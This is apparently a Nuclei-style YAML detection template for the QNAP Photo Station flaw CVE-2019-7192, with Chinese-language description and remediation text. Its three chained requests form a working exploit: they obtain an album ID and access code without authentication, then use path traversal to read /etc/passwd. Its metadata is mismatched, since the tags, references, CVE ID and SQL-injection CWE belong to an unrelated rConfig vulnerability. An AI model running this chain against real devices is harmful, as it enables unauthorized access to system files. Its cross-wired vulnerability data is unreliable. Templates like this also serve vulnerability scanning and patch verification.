id: CVE-2019-7192
info:
  name: QNAP NAS 未授权访问漏洞
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - rconfig
  - sqli
  description: |-
    QNAP Systems Photo Station 未授权访问导致远程代码执行漏洞
    QNAP Systems Photo Station是中国威联通（QNAP Systems）公司的一款照片管理和查看应用程序。

    QNAP Systems Photo Station中存在访问控制错误漏洞。远程攻击者可利用该漏洞对系统进行未经授权的访问。以下产品及版本受到影响：QNAP Systems Photo Station 6.0.3之前版本（QTS 4.4.1版本），5.7.10之前版本（QTS 4.3.4版本至4.4.0版本），5.4.9之前版本（QTS 4.3.0版本至4.3.3版本），5.2.11之前版本（QTS 4.2.6版本）。
  reference:
  - https://github.com/theguly/exploits/blob/master/cve-2020-10547.py https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
  - https://github.com/theguly/exploits/blob/master/cve-2020-10547.py
  - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
  severity: critical
  classification:
    cve-id:
    - cve-2020-10547
    cwe-id:
    - cwe-89
    - cwe-522
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://www.qnap.com/zh-tw/security-advisory/nas-201911-25
requests:
- matchers:
  - type: status
    status:
    - 200
  extractors:
  - name: album_id
    type: regex
    regex:
    - <output>(.*?)</output>
    group: 1
    part: body
    internal: true
  path:
  - '{{BaseURL}}/photo/p/api/album.php'
  method: POST
  body: a=setSlideshow&f=qsamplealbum
  headers:
    Content-Type: application/x-www-form-urlencoded
- matchers:
  - type: status
    status:
    - 200
  extractors:
  - name: access_code
    type: regex
    regex:
    - encodeURIComponent('(.*?)')
    group: 1
    part: body
    internal: true
  path:
  - '{{BaseURL}}/photo/slideshow.php?album={{album_id}}'
  method: GET
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - admin:x:0:0
  matchers-condition: and
  path:
  - '{{BaseURL}}/photo/p/api/video.php'
  method: POST
  body: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=./../../../../../etc/passwd
  headers:
    Content-Type: application/x-www-form-urlencoded
